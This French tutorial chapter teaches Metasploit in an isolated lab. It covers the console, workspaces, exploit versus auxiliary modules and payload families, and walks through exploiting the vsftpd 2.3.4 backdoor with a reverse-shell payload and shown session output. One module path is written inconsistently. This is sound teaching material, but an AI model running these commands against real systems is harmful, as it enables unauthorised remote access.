@@ -1,0 +1,198 @@
+Avec un lab isolé, un réseau de travail statique et une boucle de retour arrière maîtrisée, vous disposez enfin du terrain sur lequel la partie offensive du chapitre peut se dérouler. Cette seconde partie est consacrée à l'outil que vous allez manipuler le plus souvent, Metasploit, et à la distinction qui structure tout son catalogue : un module d'exploitation n'est pas un module auxiliaire, et confondre les deux conduit à des diagnostics absurdes. Nous terminerons par le déroulé concret d'une exploitation, de la recherche du module à l'ouverture de la session, afin que vous ne voyiez jamais dans la commande exploit une boîte noire magique.
+
+Un mot sur la manière de suivre cette partie. Ouvrez une console à côté de votre texte, créez un espace de travail nommé lab-off3, et rejouez chaque exemple sur linux-target1 plutôt que de le lire passivement. Les commandes de cette partie sont toutes sans danger pour votre poste hôte, à condition qu'elles visent les seules adresses du réseau host-only, et cette précaution, vous la vérifierez vous-même avant chaque lancement.
+
+## Metasploit dans le lab : console, projets et gestion des bases
+
+Metasploit est un framework d'exploitation modulaire : il ne contient pas tant une suite d'outils qu'une bibliothèque de modules classés par nature, un moteur d'exécution et une base de données qui retient ce que vous avez trouvé. L'installation la plus simple passe par le gestionnaire de paquets de votre distribution d'attaque, et une installation par clone du dépôt officiel reste possible si vous voulez suivre les versions au jour le jour. Dans les deux cas, la commande d'entrée est unique : msfconsole. Elle ouvre une console interactive, lente au démarrage parce qu'elle charge la totalité du catalogue, et qui affiche enfin un prompt sur lequel vous allez passer les heures qui viennent.
+
+```bash
+# installer et initialiser le framework dans le lab-off3
+sudo apt update && sudo apt install -y metasploit-framework
+msfdb init          # cree la base Postgres locale et le compte dedie
+msfdb status        # confirmer que le serveur et la base repondent
+msfconsole -q       # demarrage silencieux, sans le bandeau d'accueil
+```
+
+La console repose sur un vocabulaire réduit qu'il faut maîtriser avant tout le reste. La commande search cherche un module par mot-clé, par identifiant CVE, par plateforme ou par type, et c'est par elle qu'on commence toujours. La commande info décrit un module sans le charger : ses options, ses cibles, son rang, ses références et, souvent, un exemple de configuration. La commande use charge le module dans le contexte courant, et le prompt change alors pour afficher son identifiant complet. Vient ensuite show options, qui liste les paramètres à renseigner avec leur état, suivi de set pour affecter une valeur, de setg pour affecter une valeur globale à la session de console, et de unset pour l'effacer. La commande show payloads affiche les charges utiles compatibles avec le module choisi, et show targets les systèmes que le module sait traiter.
+
+```text
+# sequence typeique de configuration dans msfconsole
+msf6 > search type:exploit platform:linux samba
+msf6 > use exploit/unix/vsftpd_234_backdoor
+msf6 > info
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set LHOST 192.168.56.10
+msf6 > show payloads
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > exploit
+```
+
+La mémoire de la console est un point de vigilance. Les valeurs définies avec setg persistent tant que la console tourne, et un LHOST défini au chapitre précédent reste en vigueur au suivant si vous ne l'avez pas effacé. Il n'est pas rare de voir une exploitation échouer pour la seule raison que la variable globale pointe encore vers l'ancien réseau host-only. Le réflexe correct est mécanique : avant chaque lancement, relisez show options, vérifiez les trois adresses, puis exécutez unsetg LHOST si nécessaire. Une console que vous relisez est votre première ligne de défense contre vos propres oublis.
+
+La base de données change la nature du travail. Sans base, Metasploit est un catalogue ; avec base, c'est un journal de campagne. La commande workspace crée, liste et bascule entre des espaces de travail indépendants, chacun avec ses hôtes, ses services, ses vulnérabilités et ses preuves. La commande db_nmap exécute un scan dont les résultats sont enregistrés directement dans l'espace courant, et les commandes hosts, services et vulns permettent ensuite de les interroger sans rouvrir vos fichiers de sortie. Pour un lab, un espace par séance suffit, et le nom doit indiquer la date et l'objectif.
+
+```bash
+# dans msfconsole : tracer la campagne dans la base du lab-off3
+msf6 > workspace -a 2026-10-09-enum-smb
+msf6 > db_nmap -sV -sC -O 192.168.56.20
+msf6 > hosts
+msf6 > services 192.168.56.20
+msf6 > vulns 192.168.56.20
+```
+
+L'automatisation mérite deux commandes connues dès maintenant, parce qu'elles rendent vos démonstrations reproductibles. L'option -x de msfconsole exécute une chaîne de commandes puis quitte, ce qui est idéal pour rejouer une configuration sans tapage. L'option -r exécute un fichier de ressources, c'est-à-dire un script de la console contenant les mêmes commandes, une par ligne. Conservez ces fichiers dans votre dossier lab-off3 : ils constituent la preuve exécutable de la manière dont vous avez obtenu un résultat.
+
+```bash
+# rejouer une configuration complete sans intervention
+msfconsole -q -x "workspace lab-off3; use exploit/unix/vsftpd_234_backdoor; \
+set RHOSTS 192.168.56.20; set LHOST 192.168.56.10; set PAYLOAD cmd/unix/reverse; \
+set ExitOnSession false; run -j; sleep 5; sessions -l; exit"
+```
+
+La capture suivante montre une console Metasploit en fonctionnement : le catalogue affiché au démarrage, le prompt du module chargé et les options en attente de valeur. Elle correspond exactement à l'état dans lequel vous vous trouverez au milieu d'un exercice, et c'est à cet écran qu'il faut revenir pour vérifier ce que l'on s'apprête à lancer.
+
+```image
+https://upload.wikimedia.org/wikipedia/commons/thumb/9/9f/Metasploit_4.14.0_from_Kali.png/960px-Metasploit_4.14.0_from_Kali.png
+| Console Metasploit Framework exécutée dans un terminal, affichant le catalogue des modules et l'invite de commande prête à recevoir une configuration.
+```
+
+Le tableau suivant résume les commandes que vous utiliserez quotidiennement, avec la question à laquelle chacune répond.
+
+```table
+| Commande | Question à laquelle elle répond | Réflexe associé |
+| --- | --- | --- |
+| search | Quel module correspond à ce que je viens de trouver ? | Filtrer par type et par plateforme |
+| info | Que fait ce module exactement ? | Lire les références et les cibles avant de lancer |
+| show options | Ai-je tout renseigné, et pour quelle machine ? | Relire avant chaque exploitation |
+| show payloads | Quelle charge utile est compatible ? | Choisir en connaissance de la couche |
+| workspace et db_nmap | Qu'ai-je déjà trouvé, et où ? | Un espace par séance, jamais un mélange |
+| sessions et jobs | Qu'est-ce qui tourne en arrière-plan ? | Vérifier avant et après chaque lancement |
+```
+
+## Exploit et auxiliary : deux familles de modules, deux rôles
+
+Le catalogue de Metasploit est organisé en répertoires qui correspondent à des rôles distincts, et la première distinction, celle qui structure tout le reste, oppose les modules exploit aux modules auxiliary. Un module d'exploitation cherche à provoquer un comportement anormal dans un service pour y faire exécuter du code, et il livre pour cela une charge utile : son succès se mesure à l'ouverture d'une session, son échec à l'absence de session. Un module auxiliaire, lui, ne livre rien : il scanne, il récupère des informations, il force des identifiants dans un périmètre maîtrisé, il détecte des versions, il sert parfois à démontrer un déni de service en laboratoire. Son succès se mesure à la qualité de l'information obtenue, pas à une session.
+
+Cette distinction a une conséquence directe sur la manière de les lancer. Un exploit s'exécute avec exploit, ou avec son alias run, et il peut échouer silencieusement, planter la connexion cible ou ouvrir une session que vous n'attendiez pas. Un auxiliary s'exécute avec run, il produit des lignes de sortie structurées, et il s'arrête quand sa tâche est terminée. Beaucoup de modules auxiliaires sont aussi des scanners, c'est-à-dire qu'ils acceptent une plage d'adresses : dans un lab, cette plage doit toujours rester celle du réseau host-only, et la relire avant de lancer est aussi réflexe que de vérifier une adresse de destination avant d'envoyer un courriel.
+
+Un troisième point concerne le rang d'un module, affiché par la commande info. Il prend des valeurs comme manual, low, average, good, great ou excellent, et il exprime la fiabilité de l'exploitation, pas la gravité de la faille. Un module excellent n'est pas une faille critique : c'est un mécanisme d'exploitation réputé stable sur la configuration visée. Inversement, un module manual demande une intervention humaine à chaque étape, ce qui ne le rend pas inutile, mais impose de lire sa documentation entière avant de le charger. Dans un lab d'apprentissage, commencez par les modules de rang excellent sur la cible pédagogique, puis descendez vers les rangs inférieurs quand vous cherchez à comprendre la mécanique.
+
+```text
+# deux modules, deux logiques, meme console
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set THREADS 10
+msf6 > run
+# sortie : liste de ports, aucun effet sur la cible
+
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > info
+# rang affiche, cibles supportees, charge utile par defaut
+msf6 > set RHOSTS 192.168.56.20
+msf6 > exploit
+# sortie : tentative d'exploitation puis ouverture d'une session
+```
+
+Au-delà de ces deux familles, il faut connaître les modules post et les modules payload, qui interviennent à d'autres moments du cycle. Les modules post s'exécutent dans une session déjà ouverte, sur la machine compromise, et servent à collecter des informations, à explorer le réseau interne ou à tenter une élévation de privilèges : ils n'ont aucun sens sans session, et leur présence dans une démonstration prouve que vous êtes allé au-delà de l'accès initial. Les modules payload sont les charges utiles elles-mêmes, consultables avec show payloads, et leur choix détermine tout ce qui arrive ensuite, y compris la nature du shell que vous obtiendrez. Les encoders et les générateurs NOP, enfin, servent à modifier l'apparence d'une charge utile ou à préserver l'alignement mémoire attendu, et ils relèvent davantage de la compréhension du format que de l'exploitation quotidienne.
+
+```table
+| Famille | Livre-t-elle une charge utile ? | Moment d'usage | Mesure du succès |
+| --- | --- | --- | --- |
+| exploit | Oui, après déclenchement de la faille | Accès initial | Session ouverte et stable |
+| auxiliary | Non | Reconnaissance, scan, test de service | Information fiable obtenue |
+| post | Non, elle s'appuie sur une session | Après l'accès initial | Connaissance accrue de la machine |
+| payload | Elle est la charge utile | Choix avant le lancement | Compatibilité avec la cible |
+| encoder et nop | Non, elles modifient une charge | Préparation d'une charge | Exécution sans crash mémoire |
+```
+
+Le cas suivant, tiré d'une séance du lab-off3, illustre l'erreur classique qui motive cette section. Un apprenant lance un module auxiliaire de détection de version, obtient une ligne indiquant qu'un serveur SSH tourne, puis tape la commande exploit en croyant que la console va en déduire la suite. Rien ne se passe, et il en conclut que la machine n'est pas vulnérable. En réalité, il n'a jamais chargé de module d'exploitation : la console exécute exactement ce qu'on lui demande, ni plus ni moins. Le diagnostic correct se déroule en trois questions : quel module est chargé, que fait-il par nature, et ai-je renseigné ses options pour la bonne machine.
+
+## Du scan à la session : le déroulé concret d'une exploitation
+
+Nous pouvons maintenant suivre une exploitation de bout en bout, dans le lab-off3, contre la cible pédagogique linux-target1. L'objectif de cette section n'est pas de vous donner un script à recopier, mais de rendre visible chaque étape, afin que vous sachiez diagnostiquer la vôtre quand elle échouera, ce qui est la règle et non l'exception.
+
+Tout commence par la reconnaissance en base. Vous lancez un scan de services avec db_nmap, vous consultez la liste des ports ouverts avec services, et vous croisez les résultats avec les modules disponibles en tapant search suivi du nom du service ou du numéro d'identification associé. Cette étape produit souvent trois ou quatre modules candidats : filtrez ensuite par plateforme, par version exacte relevée, et par rang. Le critère décisif n'est pas le nombre de fonctionnalités du module, mais la correspondance entre sa cible déclarée et l'état réel de votre machine virtuelle.
+
+```bash
+# reconnaissance en base puis selection du module
+msf6 > workspace lab-off3
+msf6 > db_nmap -sV -sC -O 192.168.56.20
+msf6 > services 192.168.56.20 --sort port
+msf6 > search vsftpd
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > show options
+msf6 > set RHOSTS 192.168.56.20
+msf6 > set LHOST 192.168.56.10
+msf6 > show payloads
+```
+
+Vient le moment du choix de la charge utile, et il est plus important qu'il n'y paraît. L'option LHOST doit porter l'adresse de la carte host-only de la machine d'attaque, jamais une autre : si vous laissez la valeur par défaut, souvent une adresse de bouclage, la cible tentera de se connecter à elle-même et la tentative échouera sans message clair. L'option LPORT doit être libre sur la machine d'attaque, et il faut vérifier qu'aucun job précédent ne l'occupe encore. Une fois ces deux points tranchés, vous lancez exploit, ou run pour l'exécuter en arrière-plan avec l'option -j.
+
+```text
+# deroule complet dans la console, avec sortie commentee
+msf6 > set LHOST 192.168.56.10
+LHOST => 192.168.56.10
+msf6 > set ExitOnSession false
+ExitOnSession => false
+msf6 > exploit -j
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 192.168.56.10:4444
+[*] 192.168.56.20:21 - Submitted command to wrapper
+[*] Command shell session 1 opened ...
+msf6 > sessions -l
+   Id  Type  Information  Path
+   ---  ----  -----------  ----
+   1    shell  cmd/unix/reverse  192.168.56.10:4444 -> 192.168.56.20:51326
+```
+
+Sous la commande exploit, plusieurs choses se produisent simultanément, et il faut les visualiser pour diagnostiquer. Sur la machine d'attaque, un écouteur s'ouvre sur l'adresse et le port indiqués : c'est le gestionnaire de session, et il attend la connexion. Sur la cible, le module déclenche la faille, la charge utile s'exécute, puis elle initie une connexion vers l'écouteur. Dès que la connexion est acceptée, la console ouvre une session et vous rend la main. Trois pannes sont donc possibles et chacune a sa signature : le gestionnaire n'a pas démarré, le port est déjà occupé ; la connexion cible n'arrive pas, adresse ou port incorrect, pare-feu, ou route manquante ; la session s'ouvre puis se referme aussitôt, charge utile inadaptée à l'architecture ou processus éphémère.
+
+Le travail ne fait que commencer quand la session apparaît. Interrogez-la avec sessions -i suivi de son identifiant pour basculer dedans, puis revenez à la console avec background ou le raccourci clavier associé. La commande sessions -u propose d'élever une session brute vers une session plus riche, et la commande jobs liste les tâches en arrière-plan, qu'il ne faut jamais perdre de vue : un écouteur oublié occupe un port, et un port occupé fait échouer la séance suivante avec un message qui ne dit rien de cela.
+
+```table
+| Symptôme | Cause la plus probable | Vérification immédiate |
+| --- | --- | --- |
+| Started reverse handler puis rien | Port d'écoute déjà pris par un job | jobs et ss -tulpn sur la machine d'attaque |
+| Connection refused sur la cible | Mauvaise adresse LHOST ou port filtré | ip route et adresse host-only relue |
+| Session ouverte puis fermée | Charge utile incompatible avec l'architecture | uname -m et show payloads relus |
+| Aucune session, pas d'erreur | Module inadapté à la version réelle | info et version relevée par le scan |
+| Session gelée après quelques secondes | Réseau host-only coupé ou machine en veille | contrôle d'isolation relancé |
+```
+
+Un dernier point sur cette séquence, qui prépare la partie suivante. Ce que la console appelle session n'est pas un objet unique : c'est le canal de communication établi par la charge utile, et ses propriétés dépendent entièrement de cette charge. Un simple shell exécutera des commandes et rien d'autre ; une session plus riche offrira des modules dédiés, des canaux multiples et des capacités de reconnaissance interne. La nature de cette session se décide au moment du choix du payload, avant le lancement, et c'est précisément l'objet de la prochaine partie.
+
+## Payloads : ce que vous déposez après l'exploit
+
+Le terme payload désigne le code qui s'exécute sur la cible une fois le déclenchement réussi. Il faut enlever dès maintenant une idée reçue très répandue : le payload n'est pas synonyme de shell. Un shell en est une forme, la plus ancienne et la plus simple, mais le payload peut aussi être un client de gestion à distance, un module chargé en mémoire, un script d'ouverture de session ou même une charge utile qui ne fait qu'ouvrir un canal et attendre la suite. Tout ce que vous ferez après l'accès initial dépend de ce choix, et il se prend avec la commande set PAYLOAD ou avec show payloads avant le lancement.
+
+Les payloads se classent d'abord par plateforme et par architecture : un payload unix n'exécutera pas sous Windows, un payload 64 bits plantera sur une cible en 32 bits, et un payload conçu pour un service réseau ne convient pas à un processus en mémoire. La commande show payloads applique un filtre automatique en fonction du module et de la cible déclarée, mais elle ne vérifie pas l'architecture réelle : c'est à vous de relever cette information pendant la reconnaissance, avec le scan de services ou avec un module auxiliaire de détection d'exploitation.
+
+Les payloads se classent ensuite par canal de récupération. La famille cmd ou ordre de commande produit une session brute, dans laquelle vous tapez des commandes shell et recevez du texte : c'est le plus petit des payloads, le plus susceptible de fonctionner quand l'espace est limité, et le plus pauvre une fois dedans. La famille shell ouvre un interpréteur complet, avec un contexte d'environnement, ce qui améliore nettement le confort. La famille meterpreter fournit un client riche, chargé en mémoire, qui parle par canaux, expose des commandes structurées et permet de faire évoluer la session sans redémarrer la cible. Enfin, des payloads dédiés ouvrent une session dans un terminal ou dans un gestionnaire de fenêtres, ce qui est utile quand l'objectif est de montrer un accès graphique plutôt qu'un accès console.
+
+```bash
+# explorer les charges utiles compatibles avec un module choisi
+msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf6 > show payloads
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > show options
+# une charge utile unique n'a pas d'options de transport particulieres,
+# mais une charge utile riche en affichera beaucoup : LHOST, LPORT, UUID...
+```
+
+Le tableau suivant confronte les grandes familles selon trois critères qui décident réellement de votre choix : la taille de la charge, la qualité de la session obtenue et la discrétion du trafic.
+
+```table
+| Famille de payload | Taille | Session obtenue | Trafic généré |
+| --- | --- | --- | --- |
+| cmd unix ou windows | Très faible | Commandes brutes, texte brut | Direct, peu volumineux |
+| shell interactif | Faible | Interpréteur complet | Direct, un flux continu |
+| session riche en mémoire | Moyenne à élevée | Canaux multiples, commandes dédiées | Selon le transport choisi |
+| payload de type script | Variable | Dépend de l'interpréteur disponible | Souvent en plusieurs messages |
+```
+
+Une notion reste à clarifier avant de passer aux shells : la différence entre charge utile unique et charge utile étagée. Une charge utile unique contient tout, elle s'exécute d'un bloc et ne dépend de rien d'autre ; elle est donc plus volumineuse, mais elle ne génère qu'une seule connexion. Une charge utile étagée, elle, se compose d'un petit amorçage qui sert à récupérer la partie principale, et cette distinction est au cœur de la section suivante. Dans la console, elle se repère au nommage : un identifiant court se termine généralement par une référence au transport, tandis qu'un identifiant long et explicite désigne le plus souvent l'ensemble en un seul morceau.
+
+Le piège le plus fréquent, enfin, consiste à choisir un payload sans regarder ce qu'il exige de la cible. Une charge utile qui doit s'exécuter dans un service limité échouera si elle demande trop d'espace ; une charge utile qui s'attache à un processus éphémère donnera une session qui meurt à la fin de la requête ; une charge utile qui ouvre un port entrant échouera derrière un filtre qui n'autorise que les connexions sortantes. Le bon réflexe est de formuler, avant le lancement, une phrase en trois temps : ce que la charge utile ouvre, ce dont la cible a besoin pour l'accueillir, et ce qui se passe si l'une des deux conditions manque. Cette phrase, vous la noterez dans votre carnet, et c'est elle qui vous évitera de conclure trop vite à une vulnérabilité réelle lorsque l'explication tenait dans un simple détail de configuration.
